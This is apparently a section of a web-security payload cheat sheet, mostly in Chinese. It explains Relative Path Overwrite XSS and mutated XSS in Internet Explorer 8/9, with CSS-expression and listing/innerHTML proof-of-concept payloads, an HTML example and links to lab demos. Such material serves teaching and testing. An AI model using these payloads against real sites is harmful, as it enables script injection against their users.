# XSS with Relative Path Overwrite - IE 8/9 and lower

你需要这三个组件

```javascript
1) 允许CSS注入的XSS存储. : {}*{xss:expression(open(alert(1)))}
2) URL重写.
3) CSS样式表的相对寻址 : ../style.css
```

一个小的例子

```html
http://url.example.com/index.php/[RELATIVE_URL_INSERTED_HERE]
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
<link href="[RELATIVE_URL_INSERTED_HERE]/styles.css" rel="stylesheet" type="text/css" />
</head>
<body>
Stored XSS with CSS injection - Hello {}*{xss:expression(open(alert(1)))}
</body>
</html>
```

漏洞的说明

> 母体元素会强制IE的文档模式兼容IE7 ，这是执行表达式所必需的。在一个现实的场景中，它可能是一个配置文件页面，或者可能是一个共享的状态更新，这些其他用户都可以看到。我们使用“open”来防止客户端DoS重复执行警报。 
>
> 一个简单的“rpo.php/” 的请求使相对样式将页面本身作为样式表加载。实际的请求是“/labs/xss_horror_show/chapter7/rpo.php/styles.css” 浏览器认为存在另一个目录，但实际的请求被发送到文档，这实际上就是RPO攻击的工作方式。

Demo 1 at `http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo.php`
Demo 2 at `http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo2.php/fakedirectory/fakedirectory2/fakedirectory3`
MultiBrowser : `http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo3.php`

From : `http://www.thespanner.co.uk/2014/03/21/rpo/`

## Mutated XSS for Browser IE8/IE9

```javascript
<listing id=x>&lt;img src=1 onerror=alert(1)&gt;</listing>
<script>alert(document.getElementById('x').innerHTML)</script>
```

IE将多次读写(解码)HTML，攻击者XSS有效载荷将发生变化并执行。


## References

- [TODO](TODO)